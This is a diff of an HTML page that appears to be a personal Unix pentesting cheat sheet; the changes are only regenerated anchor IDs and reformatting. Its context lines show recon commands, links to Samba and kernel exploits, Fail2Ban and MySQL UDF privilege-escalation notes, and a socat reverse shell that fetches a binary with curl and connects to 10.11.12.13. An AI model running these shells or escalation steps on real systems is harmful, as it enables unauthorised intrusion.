@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2025-07-14 Mon 23:26 -->
+<!-- 2025-12-03 Wed 23:31 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Unix security</title>
@@ -31,15 +31,15 @@
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
 <li><a href="#enum">Enumeration</a></li>
-<li><a href="#orgd8e582f">Exploits</a></li>
+<li><a href="#org01c0e7b">Exploits</a></li>
 <li><a href="#priv-esc">Privilege escalation</a>
 <ul>
-<li><a href="#org22e220a">Guides and references</a></li>
-<li><a href="#org8d971e4">General-purpose tools</a></li>
-<li><a href="#orgf8c1f91">Adding user to /etc/passwd</a></li>
-<li><a href="#orgbbe3ee8">Fail2Ban</a></li>
-<li><a href="#org30e83fd">MySQL</a></li>
-<li><a href="#orgf487db3">Kernel exploits</a></li>
+<li><a href="#orgf09b4e6">Guides and references</a></li>
+<li><a href="#org0bae739">General-purpose tools</a></li>
+<li><a href="#org3cf897b">Adding user to /etc/passwd</a></li>
+<li><a href="#org561033f">Fail2Ban</a></li>
+<li><a href="#org8a82759">MySQL</a></li>
+<li><a href="#org529deaa">Kernel exploits</a></li>
 </ul>
 </li>
 <li><a href="#misc">Misc</a>
@@ -67,29 +67,29 @@ Here are a few common recon commands:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">Env</span>
-$ uname -a
+<pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">Env
+</span>$ uname -a
 $ cat /etc/*-release 2&gt;/dev/null
 $ env
 
-<span class="org-comment-delimiter"># </span><span class="org-comment">Active processes</span>
-$ ps aux | grep root
+<span class="org-comment-delimiter"># </span><span class="org-comment">Active processes
+</span>$ ps aux | grep root
 $ ps aux | grep $(<span class="org-sh-quoted-exec">whoami</span>)
 
-<span class="org-comment-delimiter"># </span><span class="org-comment">What is readable / writeable / suid</span>
-$ find / -perm -g=s -o -perm -u=s ! -type l -exec ls -lisad {} <span class="org-string">\;</span> 2&gt;/dev/null | sort -k 5,5
+<span class="org-comment-delimiter"># </span><span class="org-comment">What is readable / writeable / suid
+</span>$ find / -perm -g=s -o -perm -u=s ! -type l -exec ls -lisad {} <span class="org-string">\;</span> 2&gt;/dev/null | sort -k 5,5
 $ find / -writable -type d ! -type l -exec ls -lisad {} <span class="org-string">\;</span> 2&gt;/dev/null
 $ ls -lisaR /root /home 2&gt;/dev/null
 
-<span class="org-comment-delimiter"># </span><span class="org-comment">Capabilities</span>
-$ getcap -r / 2&gt;/dev/null | grep <span class="org-string">'set[ug]id'</span>
+<span class="org-comment-delimiter"># </span><span class="org-comment">Capabilities
+</span>$ getcap -r / 2&gt;/dev/null | grep <span class="org-string">'set[ug]id'</span>
 
-<span class="org-comment-delimiter"># </span><span class="org-comment">Other user accounts</span>
-$ cat /etc/passwd | cut -d<span class="org-string">':'</span> -f1
+<span class="org-comment-delimiter"># </span><span class="org-comment">Other user accounts
+</span>$ cat /etc/passwd | cut -d<span class="org-string">':'</span> -f1
 $ ls -lisa /home
 
-<span class="org-comment-delimiter"># </span><span class="org-comment">Network</span>
-$ cat /etc/hosts /etc/resolv.conf
+<span class="org-comment-delimiter"># </span><span class="org-comment">Network
+</span>$ cat /etc/hosts /etc/resolv.conf
 $ ip a
 $ iptables -L
 $ arp -a
@@ -100,9 +100,9 @@ $ ss -tulpn 2&gt;/dev/null | grep LISTEN
 </ul>
 </div>
 </div>
-<div id="outline-container-orgd8e582f" class="outline-2">
-<h2 id="orgd8e582f">Exploits</h2>
-<div class="outline-text-2" id="text-orgd8e582f">
+<div id="outline-container-org01c0e7b" class="outline-2">
+<h2 id="org01c0e7b">Exploits</h2>
+<div class="outline-text-2" id="text-org01c0e7b">
 <ul class="org-ul">
 <li><a href="https://www.exploit-db.com/exploits/10">Samba &lt; 2.2.8 (Linux/BSD) - Remote Code Execution</a></li>
 </ul>
@@ -112,22 +112,22 @@ $ ss -tulpn 2&gt;/dev/null | grep LISTEN
 <h2 id="priv-esc">Privilege escalation</h2>
 <div class="outline-text-2" id="text-priv-esc">
 </div>
-<div id="outline-container-org22e220a" class="outline-3">
-<h3 id="org22e220a">Guides and references</h3>
-<div class="outline-text-3" id="text-org22e220a">
+<div id="outline-container-orgf09b4e6" class="outline-3">
+<h3 id="orgf09b4e6">Guides and references</h3>
+<div class="outline-text-3" id="text-orgf09b4e6">
 <ul class="org-ul">
 <li><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation">Basic Linux Privilege Escalation</a>: guide by g0tm1lk.</li>
 <li><a href="https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html">Guide for OSCP</a>: by sushant747.</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org8d971e4" class="outline-3">
-<h3 id="org8d971e4">General-purpose tools</h3>
+<div id="outline-container-org0bae739" class="outline-3">
+<h3 id="org0bae739">General-purpose tools</h3>
 </div>
 
-<div id="outline-container-orgf8c1f91" class="outline-3">
-<h3 id="orgf8c1f91">Adding user to /etc/passwd</h3>
-<div class="outline-text-3" id="text-orgf8c1f91">
+<div id="outline-container-org3cf897b" class="outline-3">
+<h3 id="org3cf897b">Adding user to /etc/passwd</h3>
+<div class="outline-text-3" id="text-org3cf897b">
 <p>
 This adds a user with <b>root</b> privileges to the <b>/etc/passwd</b> file:
 </p>
@@ -138,13 +138,13 @@ This adds a user with <b>root</b> privileges to the <b>/etc/passwd</b> file:
 </div>
 </div>
 </div>
-<div id="outline-container-orgbbe3ee8" class="outline-3">
-<h3 id="orgbbe3ee8">Fail2Ban</h3>
-<div class="outline-text-3" id="text-orgbbe3ee8">
+<div id="outline-container-org561033f" class="outline-3">
+<h3 id="org561033f">Fail2Ban</h3>
+<div class="outline-text-3" id="text-org561033f">
 </div>
-<div id="outline-container-org67617f2" class="outline-4">
-<h4 id="org67617f2">Weak permissions</h4>
-<div class="outline-text-4" id="text-org67617f2">
+<div id="outline-container-org1f1a32f" class="outline-4">
+<h4 id="org1f1a32f">Weak permissions</h4>
+<div class="outline-text-4" id="text-org1f1a32f">
 <p>
 If the current user has write permissions on the <b><i>etc/fail2ban</i></b> configuration,
 privilege escalation can be achieved. One of the possible way is described <a href="https://youssef-ichioui.medium.com/abusing-fail2ban-misconfiguration-to-escalate-privileges-on-linux-826ad0cdafb7">here</a>,
@@ -159,17 +159,17 @@ configuration is loaded.
 </p>
 </div>
 </div>
-<div id="outline-container-orgfec0c17" class="outline-4">
-<h4 id="orgfec0c17">Whois manipulation</h4>
+<div id="outline-container-org5dea2f8" class="outline-4">
+<h4 id="org5dea2f8">Whois manipulation</h4>
 </div>
 </div>
-<div id="outline-container-org30e83fd" class="outline-3">
-<h3 id="org30e83fd">MySQL</h3>
-<div class="outline-text-3" id="text-org30e83fd">
+<div id="outline-container-org8a82759" class="outline-3">
+<h3 id="org8a82759">MySQL</h3>
+<div class="outline-text-3" id="text-org8a82759">
 </div>
-<div id="outline-container-orgddd35e4" class="outline-4">
-<h4 id="orgddd35e4">User-Defined Functions (UDF)</h4>
-<div class="outline-text-4" id="text-orgddd35e4">
+<div id="outline-container-orgda06fde" class="outline-4">
+<h4 id="orgda06fde">User-Defined Functions (UDF)</h4>
+<div class="outline-text-4" id="text-orgda06fde">
 <p>
 Privilege escalation can be achieve through UDFs (User-Defined Function)
 as described by <a href="https://medium.com/r3d-buck3t/privilege-escalation-with-mysql-user-defined-functions-996ef7d5ceaf">r3d-buck3t</a> and <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql#privilege-escalation">hacktricks</a>. Simply compile the <a href="https://www.exploit-db.com/exploits/1518">exploit</a> by
@@ -189,9 +189,9 @@ MariaDB [mysql]&gt; use mysql; create table foo(line blob); insert into foo valu
 </div>
 </div>
 </div>
-<div id="outline-container-orgf487db3" class="outline-3">
-<h3 id="orgf487db3">Kernel exploits</h3>
-<div class="outline-text-3" id="text-orgf487db3">
+<div id="outline-container-org529deaa" class="outline-3">
+<h3 id="org529deaa">Kernel exploits</h3>
+<div class="outline-text-3" id="text-org529deaa">
 <ul class="org-ul">
 <li><a href="https://www.exploit-db.com/exploits/18411">Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper'
 Local Privilege Escalation (1)</a></li>
@@ -215,23 +215,23 @@ Credit goes to:
 <li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">ROPNOP's blog</a></li>
 </ul>
 </div>
-<div id="outline-container-orgf447e20" class="outline-4">
-<h4 id="orgf447e20">Python</h4>
-<div class="outline-text-4" id="text-orgf447e20">
+<div id="outline-container-org0d89580" class="outline-4">
+<h4 id="org0d89580">Python</h4>
+<div class="outline-text-4" id="text-org0d89580">
 <div class="org-src-container">
 <pre class="src src-shell">$ python -c <span class="org-string">'import pty; pty.spawn("/bin/bash")'</span>
 </pre>
 </div>
 </div>
 </div>
-<div id="outline-container-org72bcffa" class="outline-4">
-<h4 id="org72bcffa">Socat</h4>
-<div class="outline-text-4" id="text-org72bcffa">
+<div id="outline-container-org54764d9" class="outline-4">
+<h4 id="org54764d9">Socat</h4>
+<div class="outline-text-4" id="text-org54764d9">
 <div class="org-src-container">
-<pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">On client</span>
-$ socat file:<span class="org-sh-quoted-exec">`tty`</span>,raw,<span class="org-variable-name">echo</span>=0 tcp-listen:1234
-<span class="org-comment-delimiter"># </span><span class="org-comment">On server</span>
-$ curl -o /tmp/socat -OL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+<pre class="src src-shell"><span class="org-comment-delimiter"># </span><span class="org-comment">On client
+</span>$ socat file:<span class="org-sh-quoted-exec">`tty`</span>,raw,<span class="org-variable-name">echo</span>=0 tcp-listen:1234
+<span class="org-comment-delimiter"># </span><span class="org-comment">On server
+</span>$ curl -o /tmp/socat -OL https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
 $ chmod +x /tmp/socat
 $ /tmp/socat exec:<span class="org-string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.11.12.13:1234
 </pre>
